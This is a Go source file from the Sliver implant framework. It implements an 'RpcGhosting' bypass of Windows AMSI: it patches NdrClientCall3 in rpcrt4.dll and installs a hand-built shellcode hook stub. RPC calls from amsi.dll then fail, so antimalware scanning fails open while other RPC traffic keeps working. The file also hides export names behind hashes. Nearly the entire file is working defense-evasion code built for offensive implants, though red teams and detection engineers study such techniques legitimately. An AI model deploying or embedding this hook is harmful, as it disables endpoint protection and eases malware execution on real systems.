package evasion

/*
Sliver Implant Framework
Copyright (C) 2021  Bishop Fox

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// rpc_ghosting_windows.go — RpcGhosting AMSI bypass via selective NdrClientCall3 hook
//
// Instead of patching AmsiScanBuffer (which is heavily signatured), this technique
// patches NdrClientCall3 in rpcrt4.dll — the NDR stub dispatch function for ALL
// client-side RPC calls. AMSI's Windows Defender provider communicates via RPC, so
// returning RPC_S_SERVER_UNAVAILABLE (0x6BA) from NdrClientCall3 causes AMSI to
// fail-open and stop scanning.
//
// The CRITICAL improvement over naive RpcGhosting: a selective trampoline hook that
// inspects the first argument (pProxyInfo in RCX) to determine whether the caller is
// amsi.dll. Only calls originating from amsi.dll's address range return the error code.
// All other RPC calls (crypto, COM, TLS, etc.) pass through to the original function
// unmodified via a trampoline containing the stolen prologue bytes.
//
// Without the selective hook, patching NdrClientCall3 unconditionally breaks:
//   - HTTPS downloads (crypto service RPC calls during TLS handshake)
//   - COM activation
//   - Certificate chain validation
//   - Any subsystem that routes RPC through the NDR pipeline
//
// Memory layout:
//
//	Trampoline (26 bytes):
//	  +0:  12 bytes stolen from NdrClientCall3 prologue (position-independent)
//	  +12: FF 25 00 00 00 00          jmp [rip+0]
//	  +18: [8-byte absolute addr of NdrClientCall3+12]
//
//	Hook Stub (54 bytes):
//	  +0x00: 48 3B 0D 17 00 00 00    cmp rcx, [rip+0x17]   ; amsi_start
//	  +0x07: 72 0F                   jb  call_original
//	  +0x09: 48 3B 0D 16 00 00 00    cmp rcx, [rip+0x16]   ; amsi_end
//	  +0x10: 73 06                   jae call_original
//	  +0x12: B8 BA 06 00 00          mov eax, 0x6BA
//	  +0x17: C3                      ret
//	  +0x18: FF 25 10 00 00 00       jmp [rip+0x10]         ; call_original
//	  +0x1E: [8 bytes: amsi_start]
//	  +0x26: [8 bytes: amsi_end]
//	  +0x2E: [8 bytes: trampoline addr]
//
//	NdrClientCall3 patch (12 bytes):
//	  48 B8 [8-byte stub addr] FF E0   mov rax, stub; jmp rax
//
// Reference: practicalsecurityanalytics.com/improved-rpcghosting/ (July 2026)

import (
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
	//{{if .Config.Debug}}
	"log"
	//{{end}}
)

// Pre-computed FNV-1a hash for NdrClientCall3 export name.
// Avoids plaintext "NdrClientCall3" string in the binary.
var hashNdrClientCall3 = fnv1aHash("NdrClientCall3")

// RPC_S_SERVER_UNAVAILABLE = 1722 = 0x6BA
// This is the NTSTATUS we return for AMSI's RPC calls to make the provider fail-open.
const rpcServerUnavailable = 0x6BA

// Hook stub shellcode (54 bytes).
// The amsi_start (offset 0x1E), amsi_end (offset 0x26), and trampoline (offset 0x2E)
// fields are zeroed here and filled in at runtime via WriteUint64.
var rpcGhostStub = []byte{
	// +0x00: cmp rcx, [rip+0x17] → reads amsi_start at rip+0x07+0x17 = +0x1E
	0x48, 0x3B, 0x0D, 0x17, 0x00, 0x00, 0x00,
	// +0x07: jb +0x0F → jumps to +0x09+0x0F = +0x18 (call_original)
	0x72, 0x0F,
	// +0x09: cmp rcx, [rip+0x16] → reads amsi_end at rip+0x10+0x16 = +0x26
	0x48, 0x3B, 0x0D, 0x16, 0x00, 0x00, 0x00,
	// +0x10: jae +0x06 → jumps to +0x12+0x06 = +0x18 (call_original)
	0x73, 0x06,
	// +0x12: mov eax, RPC_S_SERVER_UNAVAILABLE
	0xB8, byte(rpcServerUnavailable), byte(rpcServerUnavailable >> 8), 0x00, 0x00,
	// +0x17: ret
	0xC3,
	// +0x18: call_original: jmp [rip+0x10] → reads trampoline at rip+0x1E+0x10 = +0x2E
	0xFF, 0x25, 0x10, 0x00, 0x00, 0x00,
	// +0x1E: [amsi_start — filled at runtime]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	// +0x26: [amsi_end — filled at runtime]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	// +0x2E: [trampoline addr — filled at runtime]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
}

// Stub field offsets for runtime patching.
const (
	stubOffAmsiStart   = 0x1E
	stubOffAmsiEnd     = 0x26
	stubOffTrampoline  = 0x2E
	stubTotalSize      = 54
	trampolineTotalSize = 26
	prologueStolenSize = 12
)

// writeUint64 writes a 64-bit value to executable memory at the given offset.
func writeUint64(base uintptr, offset uintptr, val uint64) {
	*(*uint64)(unsafe.Pointer(base + offset)) = val
}

// writeBytes copies a byte slice to executable memory at the given base address.
func writeBytes(base uintptr, data []byte) {
	for i, b := range data {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = b
	}
}

// RpcGhosting applies a selective trampoline hook on NdrClientCall3 that neutralizes
// AMSI's RPC-based scanning provider without breaking other RPC consumers in the process.
//
// The hook inspects RCX (pProxyInfo — the first argument to NdrClientCall3) and checks
// whether it falls within amsi.dll's loaded memory range. If yes → returns
// RPC_S_SERVER_UNAVAILABLE (AMSI fails open). If no → routes through a trampoline
// containing the original function prologue, preserving all non-AMSI RPC functionality.
//
// Returns nil on success. Returns error if:
//   - rpcrt4.dll or NdrClientCall3 cannot be resolved
//   - amsi.dll is not loaded (nothing to ghost)
//   - memory allocation or patching fails
func RpcGhosting() error {
	// ── 1. Resolve NdrClientCall3 from rpcrt4.dll ──────────────────────────
	rpcrt4 := windows.NewLazyDLL("rpcrt4.dll")
	rpcrt4Base := uintptr(rpcrt4.Handle())
	if rpcrt4Base == 0 {
		return errors.New("rpcrt4.dll base is null")
	}

	ndrClientCall3, err := resolveExportByHash(rpcrt4Base, hashNdrClientCall3)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[RpcGhosting] NdrClientCall3 not resolved: %v\n", err)
		//{{end}}
		return errors.New("NdrClientCall3 export not found")
	}

	//{{if .Config.Debug}}
	log.Printf("[RpcGhosting] NdrClientCall3 at 0x%016x\n", ndrClientCall3)
	//{{end}}

	// ── 2. Get amsi.dll base address and memory range ──────────────────────
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	amsiBase := uintptr(amsiDLL.Handle())
	if amsiBase == 0 {
		// amsi.dll not loaded yet — force load it
		if err := amsiDLL.Load(); err != nil {
			//{{if .Config.Debug}}
			log.Printf("[RpcGhosting] amsi.dll not available: %v\n", err)
			//{{end}}
			return errors.New("amsi.dll not loaded")
		}
		amsiBase = uintptr(amsiDLL.Handle())
	}

	// Read SizeOfImage from PE Optional Header to compute amsi.dll's address range.
	// e_lfanew at DOS header +0x3C → PE header offset.
	// SizeOfImage at PE header +0x50 (Optional Header, offset 56 in PE32+).
	lfanew := *(*int32)(unsafe.Pointer(amsiBase + 0x3C))
	sizeOfImage := *(*uint32)(unsafe.Pointer(amsiBase + uintptr(lfanew) + 0x50))
	amsiStart := uint64(amsiBase)
	amsiEnd := amsiStart + uint64(sizeOfImage)

	//{{if .Config.Debug}}
	log.Printf("[RpcGhosting] amsi.dll range: 0x%016x – 0x%016x (SizeOfImage=0x%x)\n",
		amsiStart, amsiEnd, sizeOfImage)
	//{{end}}

	// ── 3. Build the trampoline (stolen prologue + jump back) ──────────────
	// The trampoline preserves the original NdrClientCall3 behavior for non-AMSI callers.
	// It contains the first 12 bytes of NdrClientCall3's prologue (stolen bytes) followed
	// by an indirect jump to NdrClientCall3+12 (resuming execution after the patch site).
	//
	// This works because standard x64 function prologues are position-independent
	// (use RSP-relative addressing, not RIP-relative). If the prologue contained a
	// RIP-relative instruction, the stolen bytes would compute wrong addresses.
	trampoline, allocErr := windows.VirtualAlloc(0, uintptr(trampolineTotalSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if trampoline == 0 {
		//{{if .Config.Debug}}
		log.Printf("[RpcGhosting] trampoline VirtualAlloc failed: %v\n", allocErr)
		//{{end}}
		return errors.New("trampoline allocation failed")
	}

	// Copy 12 bytes from NdrClientCall3's prologue into the trampoline.
	for i := 0; i < prologueStolenSize; i++ {
		*(*byte)(unsafe.Pointer(trampoline + uintptr(i))) =
			*(*byte)(unsafe.Pointer(ndrClientCall3 + uintptr(i)))
	}

	// Write the jmp [rip+0] indirect jump at offset +12 (6 bytes).
	writeBytes(trampoline+prologueStolenSize, []byte{0xFF, 0x25, 0x00, 0x00, 0x00, 0x00})

	// Write the absolute return address (NdrClientCall3+12) at offset +18.
	writeUint64(trampoline, 18, uint64(ndrClientCall3+prologueStolenSize))

	//{{if .Config.Debug}}
	log.Printf("[RpcGhosting] trampoline at 0x%016x\n", trampoline)
	//{{end}}

	// ── 4. Build the selective hook stub ───────────────────────────────────
	// The stub checks if the caller's pProxyInfo (in RCX) falls within amsi.dll's
	// memory range. If yes → return RPC_S_SERVER_UNAVAILABLE. If no → jump to
	// the trampoline which executes the original function normally.
	stub, allocErr := windows.VirtualAlloc(0, uintptr(stubTotalSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if stub == 0 {
		//{{if .Config.Debug}}
		log.Printf("[RpcGhosting] stub VirtualAlloc failed: %v\n", allocErr)
		//{{end}}
		return errors.New("stub allocation failed")
	}

	// Write the stub shellcode template.
	writeBytes(stub, rpcGhostStub)

	// Patch in the runtime values: amsi.dll range and trampoline address.
	writeUint64(stub, stubOffAmsiStart, amsiStart)
	writeUint64(stub, stubOffAmsiEnd, amsiEnd)
	writeUint64(stub, stubOffTrampoline, uint64(trampoline))

	//{{if .Config.Debug}}
	log.Printf("[RpcGhosting] hook stub at 0x%016x\n", stub)
	//{{end}}

	// ── 5. Patch NdrClientCall3 to redirect to our stub ────────────────────
	// Overwrite the first 12 bytes of NdrClientCall3 with:
	//   mov rax, stub_addr    (48 B8 [8 bytes LE])
	//   jmp rax               (FF E0)
	var patch [prologueStolenSize]byte
	patch[0] = 0x48 // REX.W prefix
	patch[1] = 0xB8 // mov rax, imm64
	stubAddr := uint64(stub)
	for i := 0; i < 8; i++ {
		patch[2+i] = byte(stubAddr >> uint(i*8)) // little-endian
	}
	patch[10] = 0xFF // jmp r/m64
	patch[11] = 0xE0 // ModRM byte: mod=11, reg=4 (jmp), rm=0 (rax)

	var oldProtect uint32
	vErr := windows.VirtualProtect(ndrClientCall3, uintptr(prologueStolenSize),
		windows.PAGE_READWRITE, &oldProtect)
	if vErr != nil {
		//{{if .Config.Debug}}
		log.Printf("[RpcGhosting] VirtualProtect(RW) failed: %v\n", vErr)
		//{{end}}
		return errors.New("VirtualProtect to RW failed")
	}

	for i := 0; i < prologueStolenSize; i++ {
		*(*byte)(unsafe.Pointer(ndrClientCall3 + uintptr(i))) = patch[i]
	}

	windows.VirtualProtect(ndrClientCall3, uintptr(prologueStolenSize),
		oldProtect, &oldProtect)

	//{{if .Config.Debug}}
	log.Printf("[RpcGhosting] NdrClientCall3 patched → stub 0x%016x (selective hook active)\n", stub)
	//{{end}}

	return nil
}
